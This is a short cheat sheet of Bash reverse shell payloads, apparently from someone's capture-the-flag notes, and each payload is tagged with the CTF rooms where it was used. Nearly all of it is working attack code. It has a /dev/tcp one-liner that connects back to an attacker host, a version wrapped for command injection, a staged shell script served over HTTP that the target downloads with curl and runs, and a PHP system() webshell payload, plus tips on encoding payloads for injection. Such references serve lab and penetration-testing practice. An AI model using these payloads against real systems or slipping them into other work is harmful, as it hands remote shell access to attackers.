# Bash TCP Reverse Shell

The most common reverse shell across Linux targets. Works on any system with Bash compiled with `/dev/tcp` support (most distros).

## One-Liner

```bash
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
```

Used on: **hijack**, **LazyAdmin**, **Billing**, **bsidesgtdav**, **Skynet**, **Internal**

## Wrapped Variants

### From a command injection or webshell (URL-safe)

```bash
bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'
```

Used on: **hijack**

### Dropped as a file and triggered separately

```bash
# Attacker: create shell.sh
echo 'bash -i >& /dev/tcp/$LHOST/4242 0>&1' > shell.sh
python3 -m http.server 8080

# Target: download and execute
curl http://$LHOST:8080/shell.sh -o /tmp/shell.sh
bash /tmp/shell.sh
```

Used on: **hijack**

### Inside a PHP system() call

```php
<?php
system('bash -c "bash -i >& /dev/tcp/$LHOST/4444 0>&1"');
?>
```

Used on: **vulnversity**, **rrootme**

## Notes

- If `/dev/tcp` is not available (rare, Alpine/busybox), fall back to `nc` or `python` reverse shells.
- Always URL-encode `&` as `%26` when injecting through HTTP parameters.
- When embedding in a `system()` call, wrap the entire command in `bash -c '...'` to ensure `/dev/tcp` expansion works.
